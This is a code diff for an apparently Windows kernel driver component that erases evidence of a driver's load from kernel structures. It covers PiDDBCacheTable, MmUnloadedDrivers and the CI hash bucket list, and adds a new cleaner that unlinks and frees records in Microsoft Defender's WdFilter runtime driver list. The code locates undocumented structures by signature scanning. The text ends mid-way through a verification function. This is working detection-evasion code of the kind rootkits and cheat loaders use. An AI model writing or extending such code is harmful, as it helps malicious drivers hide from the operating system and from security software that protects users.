@@ -1,6 +1,7 @@
-// Trace cleaning. Three cleaners, all located by runtime signature + export table, no imports, no
+// Trace cleaning. Four cleaners, all located by runtime signature + export table, no imports, no
 // hardcoded offsets beyond the record layouts. Uses ScanModuleImage, ResolveRipRelative, GetNtoskrnl,
-// EnumerateKProcess and the encoded strings.
+// EnumerateKProcess and the encoded strings. The fourth (WdFilter) is Defender's own bookkeeping and
+// is the only one that can legitimately have nothing to do on a stripped image.
 // Compiled into both variants: release builds lose print() output, but the cleaners still run from
 // DriverEntry step 0 and DriverExit
 
@@ -65,6 +66,11 @@ static uint64_t CachedMmUnloadedDrivers = 0;
 static uint64_t CachedMmLastUnloadedDriver = 0;
 static uint64_t CachedCiBase = 0;
 static uint64_t CachedHashBucketList = 0;
+static uint64_t CachedWdFilterBase = 0;
+static uint64_t CachedWdFilterList = 0;
+static uint64_t CachedWdFilterCount = 0;
+static uint64_t CachedWdFilterArray = 0;
+static uint64_t CachedWdFilterFree = 0;
 
 // Case-folded equality of two UNICODE_STRINGs (the names compared here are ASCII file names, so
 // folding the 6th bit is exact). Null buffers, odd lengths or mismatched lengths do not match
@@ -126,6 +132,17 @@ constexpr uint32_t PiDDBTableFreeOffset = 0x58;
 constexpr uint32_t MaxPiDDBEntries = 0x800;
 constexpr uint32_t MaxPiDDBTreeDepth = 64;
 constexpr uint32_t MaxPiDDBCacheNameBytes = 512;
+
+// The one name check shared by all four cleaners and their verifiers. 512 bytes is the strictest bound
+// the cleaners used (WdFilter allowed 1024), so applying it to every target is safe. The buffer must be
+// kernel-resident because every cleaner dereferences it; a rejected target is skipped, never guessed at
+static bool IsValidTraceTarget(const _UNICODE_STRING* Target)
+{
+    return Target && Target->Buffer && Target->Length && !(Target->Length & 1) &&
+           Target->Length <= MaxPiDDBCacheNameBytes &&                // same bound the cleaners used
+           Target->MaximumLength >= Target->Length &&
+           IsKernelPointer((uint64_t) Target->Buffer);
+}
 
 // Reads a header field without forming a misaligned typed pointer: the table base is only known to be
 // byte-aligned, and -Wcast-align is part of the build. The constant size makes __builtin_memcpy inline
@@ -442,27 +459,18 @@ static bool DeletePiDDBEntry(void* Table, _PiDDB_CACHE_ENTRY* Entry, const _UNIC
     return true;
 }
 
-// Deletes this driver's records from both PiDDBCacheList and PiDDBCacheTable under PiDDBLock. True only
-// when the walk completed and every matched record was deleted; false means a missing structure, a
-// damaged list, or a failed delete, not merely that no record existed
-bool ClearPiDDBCache(win::DRIVER_OBJECT* DriverObject)
+// Deletes the records naming Target from both PiDDBCacheList and PiDDBCacheTable under PiDDBLock. True
+// only when the walk completed and every matched record was deleted; false means an invalid target, a
+// missing structure, a damaged list, or a failed delete, not merely that no record existed
+bool ClearPiDDBCache(const _UNICODE_STRING* Target, uint32_t Timestamp)
 {
-    if (!DriverObject || !DriverObject->DriverSection)
-    {
-        print(ERROR("PiDDB: no DriverObject or DriverSection (manual mapping?), nothing to clean"));
-        return false;
-    }
-
-    auto Kldr = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;
-    if (!Kldr->BaseDllName.Buffer || !Kldr->BaseDllName.Length ||
-        (Kldr->BaseDllName.Length & 1) || Kldr->BaseDllName.Length > MaxPiDDBCacheNameBytes ||
-        !IsKernelPointer((uint64_t) Kldr->BaseDllName.Buffer))
+    if (!IsValidTraceTarget(Target))
     {
         print(ERROR("PiDDB: loader entry has no valid BaseDllName"));
         return false;
     }
 
-    ::print(INFO("PiDDB: target %wZ, timestamp %08x"), &Kldr->BaseDllName, Kldr->TimeDateStamp);
+    ::print(INFO("PiDDB: target %wZ, timestamp %08x"), Target, Timestamp);
 
     address Nt = GetNtoskrnl();
     if (!Nt) return false;
@@ -514,13 +522,13 @@ bool ClearPiDDBCache(win::DRIVER_OBJECT* DriverObject)
         }
 
         Walked++;
-        if (PiDDBEntryIsTarget(Entry, &Kldr->BaseDllName, Kldr->TimeDateStamp))
+        if (PiDDBEntryIsTarget(Entry, Target, Timestamp))
         {
             Targets++;
             ::print(INFO("PiDDB: deleting entry %p (%wZ, timestamp %08x)"),
                     (void *) Entry, &Entry->DriverName, Entry->TimeDateStamp);
 
-            if (DeletePiDDBEntry(Table, Entry, &Kldr->BaseDllName))
+            if (DeletePiDDBEntry(Table, Entry, Target))
                 Deleted++;
             else
                 Failures++;
@@ -544,7 +552,7 @@ bool ClearPiDDBCache(win::DRIVER_OBJECT* DriverObject)
     return ListOk && Failures == 0;
 }
 
-#ifdef DEBUG
+
 // Debug-only walk of the AVL tree through the table root. The list and tree must agree, and no node
 // may still match this driver. The tree root is RTL_AVL_TABLE.BalancedRoot.RightChild; user data starts
 // one RTL_BALANCED_LINKS past the node header. The caller holds PiDDBLock so inserts cannot race the walk
@@ -642,19 +650,11 @@ static bool VerifyPiDDBTree(void* Table, const _UNICODE_STRING* Name, uint32_t T
 }
 
 // Debug-only self-check of the PiDDB cleaner, run right after it inside CleanDriverTraces. It takes
-// PiDDBLock, walks both structures and confirms neither still matches this driver, then checks that the
-// list and table contain the same number of entries. Release builds drop the whole function
-void VerifyPiDDBCache(win::DRIVER_OBJECT* DriverObject)
+// PiDDBLock, walks both structures and confirms neither still matches the target, then checks that the
+// list and table contain the same number of entries. Release builds drop the whole call
+void VerifyPiDDBCache(const _UNICODE_STRING* Target, uint32_t Timestamp)
 {
-    if (!DriverObject || !DriverObject->DriverSection)
-    {
-        print(ERROR("VerifyPiDDB: no DriverObject or DriverSection, cannot verify"));
-        return;
-    }
-
-    auto Kldr = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;
-    if (!Kldr->BaseDllName.Buffer || !Kldr->BaseDllName.Length ||
-        (Kldr->BaseDllName.Length & 1) || Kldr->BaseDllName.Length > MaxPiDDBCacheNameBytes)
+    if (!IsValidTraceTarget(Target))
     {
         print(ERROR("VerifyPiDDB: loader entry has no valid BaseDllName, cannot verify"));
         return;
@@ -686,11 +686,11 @@ void VerifyPiDDBCache(win::DRIVER_OBJECT* DriverObject)
 
     bool ListOk = ForEachPiDDBEntry(Head, [&](auto Entry) {
         ListWalked++;
-        if (!Leaked && PiDDBEntryIsTarget(Entry, &Kldr->BaseDllName, Kldr->TimeDateStamp))
+        if (!Leaked && PiDDBEntryIsTarget(Entry, Target, Timestamp))
             Leaked = Entry;
     });
 
-    bool TreeOk = ListOk && VerifyPiDDBTree(Table, &Kldr->BaseDllName, Kldr->TimeDateStamp, &TreeWalked);
+    bool TreeOk = ListOk && VerifyPiDDBTree(Table, Target, Timestamp, &TreeWalked);
 
     PiDDBReleaseFn(Lock);
 
@@ -722,7 +722,6 @@ void VerifyPiDDBCache(win::DRIVER_OBJECT* DriverObject)
     print(OK("VerifyPiDDB: all checks passed (list %u, tree %u, none match this driver)"),
           ListWalked, TreeWalked);
 }
-#endif
 
 // ---------------------------------------------------------------------------
 // Cleaner 2: MmUnloadedDrivers / MmLastUnloadedDriver
@@ -936,18 +935,14 @@ static void NormalizeMmUnloadTimes(_MM_UNLOADED_DRIVER* Table)
     }
 }
 
-// Removes this driver's records from MmUnloadedDrivers and fixes the count in one pass. True
+// Removes the records naming Target from MmUnloadedDrivers and fixes the count in one pass. True
 // when the walk completed
-bool ClearMmUnloadedDrivers(win::DRIVER_OBJECT* DriverObject)
+bool ClearMmUnloadedDrivers(const _UNICODE_STRING* Target, uint32_t Timestamp)
 {
-    if (!DriverObject || !DriverObject->DriverSection)
-    {
-        print(ERROR("MmUnloaded: no DriverObject or DriverSection (manual mapping?), nothing to clean"));
-        return false;
-    }
+    // An unload record carries no timestamp to match on; the name is the only key here
+    (void) Timestamp;
 
-    auto Kldr = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;
-    if (!Kldr->BaseDllName.Buffer || !Kldr->BaseDllName.Length)
+    if (!IsValidTraceTarget(Target))
     {
         print(ERROR("MmUnloaded: loader entry has no BaseDllName"));
         return false;
@@ -971,7 +966,7 @@ bool ClearMmUnloadedDrivers(win::DRIVER_OBJECT* DriverObject)
     // load/unload path; a concurrent kernel insert would be another driver unloading at this instant.
     // The count update in RemoveMmUnloadRecords is clamped, so a stale read cannot underflow it.
     // One pass removes every matching record; duplicates no longer need the old four-pass chase
-    uint32_t Removed = RemoveMmUnloadRecords(Kldr->BaseDllName.Buffer, Table, Count, IsMmUnloadedFilled(Table));
+    uint32_t Removed = RemoveMmUnloadRecords(Target->Buffer, Table, Count, IsMmUnloadedFilled(Table));
     bool Modified = Removed != 0;
     if (Modified) NormalizeMmUnloadTimes(Table);
 
@@ -983,21 +978,16 @@ bool ClearMmUnloadedDrivers(win::DRIVER_OBJECT* DriverObject)
     return true;
 }
 
-#ifdef DEBUG
 // Debug-only self-check of the MmUnloaded cleaner, run right after it inside CleanDriverTraces. The
 // first MmLastUnloadedDriver slots must be occupied and well formed, every slot (including stale slots
-// past the count that the kernel leaves behind after a full-array reset) must be free of this driver's
-// name, and the count must stay in range. Release builds drop both this function and its call
-void VerifyMmUnloadedDrivers(win::DRIVER_OBJECT* DriverObject)
+// past the count that the kernel leaves behind after a full-array reset) must be free of the target's
+// name, and the count must stay in range. Release builds drop both this call and its verifier
+void VerifyMmUnloadedDrivers(const _UNICODE_STRING* Target, uint32_t Timestamp)
 {
-    if (!DriverObject || !DriverObject->DriverSection)
-    {
-        print(ERROR("VerifyMmUnloaded: no DriverObject or DriverSection, cannot verify"));
-        return;
-    }
+    // An unload record carries no timestamp to match on; the name is the only key here
+    (void) Timestamp;
 
-    auto Kldr = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;
-    if (!Kldr->BaseDllName.Buffer || !Kldr->BaseDllName.Length)
+    if (!IsValidTraceTarget(Target))
     {
         print(ERROR("VerifyMmUnloaded: loader entry has no BaseDllName, cannot verify"));
         return;
@@ -1051,7 +1041,7 @@ void VerifyMmUnloadedDrivers(win::DRIVER_OBJECT* DriverObject)
             return;
         }
 
-        if (Leaked == MmUnloadedDriversSize && MmUnloadNameMatches(Entry, Kldr->BaseDllName.Buffer))
+        if (Leaked == MmUnloadedDriversSize && MmUnloadNameMatches(Entry, Target->Buffer))
             Leaked = Index;
     }
 
@@ -1064,7 +1054,6 @@ void VerifyMmUnloadedDrivers(win::DRIVER_OBJECT* DriverObject)
     print(OK("VerifyMmUnloaded: all checks passed (%u used, %u nonempty, none name this driver)"),
           Used, Occupied);
 }
-#endif
 
 // ---------------------------------------------------------------------------
 // Cleaner 3: the CI kernel hash bucket list
@@ -1171,7 +1160,7 @@ static wchar_t FoldHashBucketChar(wchar_t Character)
 }
 
 // Compare the base-name suffix of a full image path: CI stores
-// "\Windows\System32\drivers\Driver.sys", while DriverSection->BaseDllName is "Driver.sys"
+// "\Windows\System32\drivers\Driver.sys", while the cleaner's target is the base name "Driver.sys"
 static bool HashBucketNameMatches(const wchar_t* Name, uint32_t NameChars,
                                   const wchar_t* Base, uint32_t BaseChars)
 {
@@ -1310,16 +1299,12 @@ static bool UnlinkHashBucketEntries(ULONGLONG* Heads, const wchar_t* Base, uint3
     return Complete;
 }
 
-bool ClearKernelHashBucketList(win::DRIVER_OBJECT* DriverObject)
+bool ClearKernelHashBucketList(const _UNICODE_STRING* Target, uint32_t Timestamp)
 {
-    if (!DriverObject || !DriverObject->DriverSection)
-    {
-        print(ERROR("HashBucket: no DriverObject or DriverSection (manual mapping?), nothing to clean"));
-        return false;
-    }
+    // A hash-bucket entry carries no timestamp to match on; the name is the only key here
+    (void) Timestamp;
 
-    auto Kldr = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;
-    if (!Kldr->BaseDllName.Buffer || !Kldr->BaseDllName.Length || (Kldr->BaseDllName.Length & 1))
+    if (!IsValidTraceTarget(Target))
     {
         print(ERROR("HashBucket: loader entry has no usable BaseDllName"));
         return false;
@@ -1336,8 +1321,8 @@ bool ClearKernelHashBucketList(win::DRIVER_OBJECT* DriverObject)
     if (!Heads) return false;
 
     uint32_t Removed = 0;
-    bool Complete = UnlinkHashBucketEntries(Heads, Kldr->BaseDllName.Buffer,
-                                            (uint32_t) Kldr->BaseDllName.Length / 2, &Removed);
+    bool Complete = UnlinkHashBucketEntries(Heads, Target->Buffer,
+                                            (uint32_t) Target->Length / 2, &Removed);
 
     if (!Complete)
         print(WARN("HashBucket: walk hit a malformed link or the %u entry bound"), MaxHashBucketEntries);
@@ -1349,22 +1334,16 @@ bool ClearKernelHashBucketList(win::DRIVER_OBJECT* DriverObject)
     return Complete;
 }
 
-#ifdef DEBUG
 // Debug-only self-check of the hash-bucket cleaner, run right after it inside CleanDriverTraces. Walks
 // both heads and confirms every link stays canonical, every entry's name is readable, and no entry still
-// matches this driver's base name. The cleaner is lock-free, so this is a sampling check, not a barrier.
-// Release builds drop both this function and its call
-void VerifyKernelHashBucketList(win::DRIVER_OBJECT* DriverObject)
+// matches the target's base name. The cleaner is lock-free, so this is a sampling check, not a barrier.
+// Release builds drop both this call and its verifier
+void VerifyKernelHashBucketList(const _UNICODE_STRING* Target, uint32_t Timestamp)
 {
-    if (!DriverObject || !DriverObject->DriverSection)
-    {
-        print(ERROR("VerifyHashBucket: no DriverObject or DriverSection, cannot verify"));
-        return;
-    }
+    // A hash-bucket entry carries no timestamp to match on; the name is the only key here
+    (void) Timestamp;
 
-    auto Kldr = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;
-    if (!Kldr->BaseDllName.Buffer || !Kldr->BaseDllName.Length ||
-        (Kldr->BaseDllName.Length & 1) || Kldr->BaseDllName.Length > MaxHashBucketNameChars * 2)
+    if (!IsValidTraceTarget(Target))
     {
         print(ERROR("VerifyHashBucket: loader entry has no valid BaseDllName, cannot verify"));
         return;
@@ -1396,8 +1375,8 @@ void VerifyKernelHashBucketList(win::DRIVER_OBJECT* DriverObject)
                 break;
             }
 
-            if (HashBucketEntryMatches(Current, Kldr->BaseDllName.Buffer,
-                                       (uint32_t) Kldr->BaseDllName.Length / 2))
+            if (HashBucketEntryMatches(Current, Target->Buffer,
+                                       (uint32_t) Target->Length / 2))
             {
                 print(ERROR("VerifyHashBucket: entry %p still names this driver"), (void*) Current);
                 Leaked++;
@@ -1440,26 +1419,499 @@ void VerifyKernelHashBucketList(win::DRIVER_OBJECT* DriverObject)
 
     print(OK("VerifyHashBucket: all checks passed (%u entries, none match this driver)"), Walked);
 }
-#endif
 
-// One pass over the three load traces, each its own small cleaner above. Runs at load (step 0, wiping what
-// earlier cycles left) and at unload (dropping records from previous cycles; whatever MM adds after the
-// unload callback returns is cleaned by the next load's step 0)
+// ---------------------------------------------------------------------------
+// Cleaner 4: WdFilter's runtime driver list
+// ---------------------------------------------------------------------------
+
+// Defender's blocklist engine keeps its own record of every kernel image it has seen in
+// WdFilter!MpBmDocOpenRules: a count, a pointer array over the same records, and a doubly linked list
+// threaded through them. None of that lives in the CI structures the three cleaners above reach, so a
+// clean PiDDB / MmUnloadedDrivers / hash bucket still leaves this list naming the driver. Layout on
+// the 19041 reference image:
+//
+//   MpBmDocOpenRules + 0x60  ULONG       RuntimeDriversCount
+//   MpBmDocOpenRules + 0x68  PVOID*      RuntimeDriversArray
+//   MpBmDocOpenRules + 0x70  LIST_ENTRY  RuntimeDriversList head
+//
+//   entry + 0x00  LIST_ENTRY
+//   entry + 0x10  UNICODE_STRING ImageName (full path)
+//   entry - 0x10  the value stored in RuntimeDriversArray for this record
+//   entry - 0x20  DriverInfo, USHORT Magic at +0; MpFreeDriverInfoEx releases it
+//
+// WdFilter is absent on images without Defender, so a missing module is a skip rather than a failure.
+// The DriverInfo release is guarded by its magic: a record from a different WdFilter build must not be
+// freed through a routine that no longer matches its layout.
+constexpr uint16_t WdFilterDriverInfoMagic = 0xDA18;
+constexpr uint32_t WdFilterListHeadDelta = 0x8;    // the lea targets head + 8
+constexpr uint32_t WdFilterArrayFromCount = 0x8;   // the array pointer global sits at count + 8
+constexpr uint32_t WdFilterNameOffset = 0x10;
+constexpr uint32_t WdFilterArrayEntryDelta = 0x10;
+constexpr uint32_t WdFilterDriverInfoDelta = 0x20;
+constexpr uint32_t WdFilterArrayEntries = 0x100;   // widest array MpBmDocOpenRules keeps
+constexpr uint32_t MaxWdFilterEntries = 0x100;
+constexpr uint32_t MaxWdFilterNameChars = 512;
+
+typedef void (*MpFreeDriverInfoEx_t)(void* DriverInfo);
+
+// WdFilter.sys base from the kernel module list. A miss means Defender is not running this boot, which
+// is deterministic for the rest of the boot like the ci.dll lookup above
+static address FindWdFilterBase()
+{
+    uint64_t Cached = __atomic_load_n(&CachedWdFilterBase, __ATOMIC_SEQ_CST);
+    if (Cached) return Cached == Failed ? nullptr : (address) Cached;
+
+    auto Name = Decode(WdFilterName);
+    address Base = EnumerateKProcess(Name.data());
+
+    __atomic_store_n(&CachedWdFilterBase, Base ? (uint64_t) Base : Failed, __ATOMIC_SEQ_CST);
+    return Base;
+}
+
+// The list head, from the rip-relative `lea` at the match; its target is head + 8
+static _LIST_ENTRY* FindWdFilterList(address Wd)
+{
+    uint64_t Cached = __atomic_load_n(&CachedWdFilterList, __ATOMIC_SEQ_CST);
+    if (Cached) return Cached == Failed ? nullptr : (_LIST_ENTRY*) Cached;
+
+    address Match = ScanModuleImage(Wd, Decode(WdFilterRuntimeDriversListSignature));
+    if (!Match)
+    {
+        print(ERROR("WdFilter: list signature not found"));
+        __atomic_store_n(&CachedWdFilterList, Failed, __ATOMIC_SEQ_CST);
+        return nullptr;
+    }
+
+    auto List = (_LIST_ENTRY*) ((uintptr_t) ResolveRipRelative((const void*) Match, 3, 7) -
+                                WdFilterListHeadDelta);
+    if (!IsKernelPointer((uint64_t) List) || !IsAddressInImage(Wd, (uint64_t) List) ||
+        !IsKernelPointer((uint64_t) List->Flink) || !IsKernelPointer((uint64_t) List->Blink))
+    {
+        print(ERROR("WdFilter: list head %p is not a plausible list in WdFilter"), (void*) List);
+        __atomic_store_n(&CachedWdFilterList, Failed, __ATOMIC_SEQ_CST);
+        return nullptr;
+    }
+
+    __atomic_store_n(&CachedWdFilterList, (uint64_t) List, __ATOMIC_SEQ_CST);
+    print(INFO("WdFilter: list head %p"), (void*) List);
+    return List;
+}
+
+// The used-record count, from the `inc dword ptr [rip+disp]` in the same routine
+static uint32_t* FindWdFilterCount(address Wd)
+{
+    uint64_t Cached = __atomic_load_n(&CachedWdFilterCount, __ATOMIC_SEQ_CST);
+    if (Cached) return Cached == Failed ? nullptr : (uint32_t*) Cached;
+
+    address Match = ScanModuleImage(Wd, Decode(WdFilterRuntimeDriversCountSignature));
+    if (!Match)
+    {
+        print(ERROR("WdFilter: count signature not found"));
+        __atomic_store_n(&CachedWdFilterCount, Failed, __ATOMIC_SEQ_CST);
+        return nullptr;
+    }
+
+    auto Count = (uint32_t*) ResolveRipRelative((const void*) Match, 2, 6);
+    if (!IsKernelPointer((uint64_t) Count) || !IsAddressInImage(Wd, (uint64_t) Count) ||
+        *Count > WdFilterArrayEntries)
+    {
+        print(ERROR("WdFilter: count %p holds %u, not a plausible record count"),
+              (void*) Count, Count ? *Count : 0);
+        __atomic_store_n(&CachedWdFilterCount, Failed, __ATOMIC_SEQ_CST);
+        return nullptr;
+    }
+
+    // Only the pointer is cached; the count itself changes with every image load and is read live
+    __atomic_store_n(&CachedWdFilterCount, (uint64_t) Count, __ATOMIC_SEQ_CST);
+    print(INFO("WdFilter: count %p = %u records"), (void*) Count, *Count);
+    return Count;
+}
+
+// The record array: a global pointer at count + 8 that the routine dereferences for every access
+static void** FindWdFilterArray(uint32_t* Count)
+{
+    uint64_t Cached = __atomic_load_n(&CachedWdFilterArray, __ATOMIC_SEQ_CST);
+    if (Cached) return Cached == Failed ? nullptr : (void**) Cached;
+
+    void** Slot = (void**) ((uintptr_t) Count + WdFilterArrayFromCount);
+    auto Array = (void**) *Slot;
+    if (!IsKernelPointer((uint64_t) Array))
+    {
+        print(ERROR("WdFilter: array slot %p holds %p, not a kernel pointer"), (void*) Slot, (void*) Array);
+
+        // An empty list may legitimately have no array allocated yet; that is not a permanent miss
+        if (*Count == 0) return nullptr;
+
+        __atomic_store_n(&CachedWdFilterArray, Failed, __ATOMIC_SEQ_CST);
+        return nullptr;
+    }
+
+    __atomic_store_n(&CachedWdFilterArray, (uint64_t) Array, __ATOMIC_SEQ_CST);
+    print(INFO("WdFilter: array %p"), (void*) Array);
+    return Array;
+}
+
+// MpFreeDriverInfoEx, resolved from the call site inside WdFilter rather than by name (not exported).
+// The two known instruction shapes put the E8 at match+3 or match+6, and the call target is a kernel
+// routine, so the result must land inside WdFilter.sys itself
+static MpFreeDriverInfoEx_t FindWdFilterFreeDriverInfo(address Wd)
+{
+    uint64_t Cached = __atomic_load_n(&CachedWdFilterFree, __ATOMIC_SEQ_CST);
+    if (Cached) return Cached == Failed ? nullptr : (MpFreeDriverInfoEx_t) Cached;
+
+    address Match = ScanModuleImage(Wd, Decode(WdFilterFreeDriverInfoSignature));
+    uint32_t CallOffset = 3;
+    if (!Match)
+    {
+        Match = ScanModuleImage(Wd, Decode(WdFilterFreeDriverInfoSignatureAlt));
+        CallOffset = 6;
+    }
+    if (!Match)
+    {
+        print(ERROR("WdFilter: MpFreeDriverInfoEx signature not found"));
+        __atomic_store_n(&CachedWdFilterFree, Failed, __ATOMIC_SEQ_CST);
+        return nullptr;
+    }
+
+    address Call = (address) ((uintptr_t) Match + CallOffset);
+    auto Free = (MpFreeDriverInfoEx_t) ResolveRipRelative((const void*) Call, 1, 5);
+    if (!IsKernelPointer((uint64_t) Free) || !IsAddressInImage(Wd, (uint64_t) Free))
+    {
+        print(ERROR("WdFilter: resolved MpFreeDriverInfoEx %p is not inside WdFilter"), (void*) Free);
+        __atomic_store_n(&CachedWdFilterFree, Failed, __ATOMIC_SEQ_CST);
+        return nullptr;
+    }
+
+    __atomic_store_n(&CachedWdFilterFree, (uint64_t) Free, __ATOMIC_SEQ_CST);
+    print(INFO("WdFilter: MpFreeDriverInfoEx %p"), (void*) Free);
+    return Free;
+}
+
+// Reads the record's UNICODE_STRING without assuming alignment. The same validation the hash-bucket
+// reader applies: even length, bounded, buffer is a kernel pointer
+static bool ReadWdFilterName(uint64_t Entry, _UNICODE_STRING* Name)
+{
+    __builtin_memcpy(Name, (const void*) (uintptr_t) (Entry + WdFilterNameOffset), sizeof(*Name));
+    if (!Name->Length || Name->Length > Name->MaximumLength || (Name->Length & 1) ||
+        Name->Length > MaxWdFilterNameChars * 2 || !Name->Buffer ||
+        !IsKernelPointer((uint64_t) Name->Buffer))
+        return false;
+
+    return true;
+}
+
+// Unlink a record from the runtime list. The neighbors must agree that this node is between them;
+// anything else is a damaged list and is left alone rather than made worse
+static bool UnlinkWdFilterEntry(_LIST_ENTRY* Link)
+{
+    if (!IsKernelPointer((uint64_t) Link->Flink) || !IsKernelPointer((uint64_t) Link->Blink) ||
+        Link->Flink == Link || Link->Blink == Link ||
+        Link->Flink->Blink != Link || Link->Blink->Flink != Link)
+        return false;
+
+    Link->Blink->Flink = Link->Flink;
+    Link->Flink->Blink = Link->Blink;
+    return true;
+}
+
+// Drop one value from the count-terminated pointer array, compacting the live prefix and leaving the
+// slot past the new count null. Returns false when the record was not in the array
+static bool RemoveWdFilterArraySlot(void** Array, uint32_t* Count, uintptr_t Value)
+{
+    uint32_t InUse = *Count;
+    if (!Array || InUse > WdFilterArrayEntries) return false;
+
+    for (uint32_t Index = 0; Index < InUse; ++Index)
+    {
+        uintptr_t Slot = 0;
+        __builtin_memcpy(&Slot, &Array[Index], sizeof(Slot));
+        if (Slot != Value) continue;
+
+        for (uint32_t Move = Index; Move + 1 < InUse; ++Move)
+            Array[Move] = Array[Move + 1];
+        Array[InUse - 1] = nullptr;
+        *Count = InUse - 1;
+        return true;
+    }
+
+    return false;
+}
+
+// Release the DriverInfo block through WdFilter's own routine. The magic is the version gate: a build
+// that changed the layout must be recognized here, not freed on a guess
+static void ReleaseWdFilterDriverInfo(MpFreeDriverInfoEx_t Free, uintptr_t DriverInfo)
+{
+    if (!Free || !IsKernelPointer(DriverInfo)) return;
+
+    uint16_t Magic = 0;
+    __builtin_memcpy(&Magic, (const void*) DriverInfo, sizeof(Magic));
+    if (Magic != WdFilterDriverInfoMagic)
+    {
+        print(WARN("WdFilter: DriverInfo %p magic %04x is not %04x, not released"),
+              (void*) DriverInfo, Magic, WdFilterDriverInfoMagic);
+        return;
+    }
+
+    Free((void*) DriverInfo);
+}
+
+// Removes the records naming Target from WdFilter's runtime list. True when the module is absent
+// (nothing owns the list), or when the walk completed and every matched record was removed. No Defender
+// lock is available to take, so the array is compacted before the count drops and the record is unlinked
+// before its DriverInfo is freed: a concurrent reader never sees a live count over a hole or a freed entry
+bool ClearWdFilterDriverList(const _UNICODE_STRING* Target, uint32_t Timestamp)
+{
+    // A runtime-list record carries no timestamp to match on; the name is the only key here
+    (void) Timestamp;
+
+    if (!IsValidTraceTarget(Target))
+    {
+        print(ERROR("WdFilter: loader entry has no valid BaseDllName"));
+        return false;
+    }
+
+    address Wd = FindWdFilterBase();
+    if (!Wd)
+    {
+        print(INFO("WdFilter: not loaded, clear skipped"));
+        return true;
+    }
+
+    _LIST_ENTRY* Head = FindWdFilterList(Wd);
+    uint32_t* Count = FindWdFilterCount(Wd);
+    void** Array = Count ? FindWdFilterArray(Count) : nullptr;
+    MpFreeDriverInfoEx_t Free = FindWdFilterFreeDriverInfo(Wd);
+    if (!Head || !Count || !Free)
+        return false;
+
+    if (!Array && *Count != 0)
+    {
+        print(ERROR("WdFilter: %u records but no array, refusing to walk"), *Count);
+        return false;
+    }
+    if (!Array)
+        print(INFO("WdFilter: no array allocated, array removal skipped"));
+
+    const wchar_t* Base = Target->Buffer;
+    uint32_t BaseChars = Target->Length / sizeof(wchar_t);
+
+    uint32_t Walked = 0, Removed = 0, Failures = 0;
+    bool Complete = true;
+
+    _LIST_ENTRY* Link = Head->Flink;
+    while (Link != Head)
+    {
+        if (!IsKernelPointer((uint64_t) Link) || Walked >= MaxWdFilterEntries)
+        {
+            print(WARN("WdFilter: malformed link %p, clean stopped"), (void*) Link);
+            Complete = false;
+            break;
+        }
+
+        // Saved before any mutation: the unlink below rewrites this node's neighbors, not this link
+        _LIST_ENTRY* Next = Link->Flink;
+        auto Entry = (uintptr_t) Link;
+        _UNICODE_STRING Name = {};
+        bool Named = ReadWdFilterName(Entry, &Name);
+
+        Walked++;
+        if (Named && HashBucketNameMatches(Name.Buffer, Name.Length / 2, Base, BaseChars))
+        {
+            ::print(INFO("WdFilter: removing %wZ"), &Name);
+
+            if (!UnlinkWdFilterEntry(Link))
+            {
+                print(WARN("WdFilter: entry %p has inconsistent list links, not removed"), (void*) Entry);
+                Failures++;
+                Link = Next;
+                continue;
+            }
+
+            if (Array && !RemoveWdFilterArraySlot(Array, Count, Entry - WdFilterArrayEntryDelta))
+            {
+                print(WARN("WdFilter: entry %p was not in RuntimeDriversArray (count %u)"),
+                      (void*) Entry, *Count);
+            }
+
+            ReleaseWdFilterDriverInfo(Free, Entry - WdFilterDriverInfoDelta);
+            Removed++;
+        }
+
+        Link = Next;
+    }
+
+    if (!Complete)
+        print(WARN("WdFilter: clean walk stopped early (damaged list), result may be partial"));
+    if (Failures)
+        print(WARN("WdFilter: %u records could not be removed"), Failures);
+    if (!Removed)
+        print(INFO("WdFilter: no record for this driver out of %u walked"), Walked);
+    else
+        print(OK("WdFilter: %u records removed (%u walked, count now %u)"), Removed, Walked, *Count);
+
+    return Complete && Failures == 0;
+}
+
+// Debug-only self-check of the WdFilter cleaner, run right after it inside CleanDriverTraces. No record
+// may still match the target, the count must stay inside the array bound, and every slot below the count
+// must still point at an allocation
+void VerifyWdFilterDriverList(const _UNICODE_STRING* Target, uint32_t Timestamp)
+{
+    // A runtime-list record carries no timestamp to match on; the name is the only key here
+    (void) Timestamp;
+
+    if (!IsValidTraceTarget(Target))
+    {
+        print(ERROR("VerifyWdFilter: loader entry has no BaseDllName, cannot verify"));
+        return;
+    }
+
+    address Wd = FindWdFilterBase();
+    if (!Wd)
+    {
+        print(INFO("VerifyWdFilter: WdFilter not loaded, nothing to verify"));
+        return;
+    }
+
+    _LIST_ENTRY* Head = FindWdFilterList(Wd);
+    uint32_t* Count = FindWdFilterCount(Wd);
+    void** Array = Count ? FindWdFilterArray(Count) : nullptr;
+    if (!Head || !Count)
+    {
+        print(ERROR("VerifyWdFilter: list/count not found, cannot verify"));
+        return;
+    }
+
+    uint32_t InUse = *Count;
+    if (InUse > WdFilterArrayEntries)
+    {
+        print(ERROR("VerifyWdFilter: count %u exceeds the %u-entry array"), InUse, WdFilterArrayEntries);
+        return;
+    }
+
+    if (!Array)
+    {
+        if (InUse)
+        {
+            print(ERROR("VerifyWdFilter: %u records but no array"), InUse);
+            return;
+        }
+    }
+    else
+    {
+        for (uint32_t Index = 0; Index < InUse; ++Index)
+        {
+            if (!IsKernelPointer((uint64_t) Array[Index]))
+            {
+                print(ERROR("VerifyWdFilter: array slot %u is %p below count %u"),
+                      Index, Array[Index], InUse);
+                return;
+            }
+        }
+    }
+
+    const wchar_t* Base = Target->Buffer;
+    uint32_t BaseChars = Target->Length / sizeof(wchar_t);
+    uint32_t Walked = 0;
+    bool Complete = true;
+
+    _LIST_ENTRY* Link = Head->Flink;
+    while (Link != Head)
+    {
+        if (!IsKernelPointer((uint64_t) Link) || Walked >= MaxWdFilterEntries)
+        {
+            Complete = false;
+            break;
+        }
+
+        _UNICODE_STRING Name = {};
+        if (ReadWdFilterName((uintptr_t) Link, &Name) &&
+            HashBucketNameMatches(Name.Buffer, Name.Length / 2, Base, BaseChars))
+        {
+            ::print(ERROR("VerifyWdFilter: FAILED, record %p still names this driver (%wZ)"),
+                  (void*) Link, &Name);
+            return;
+        }
+
+        Walked++;
+        Link = Link->Flink;
+    }
+
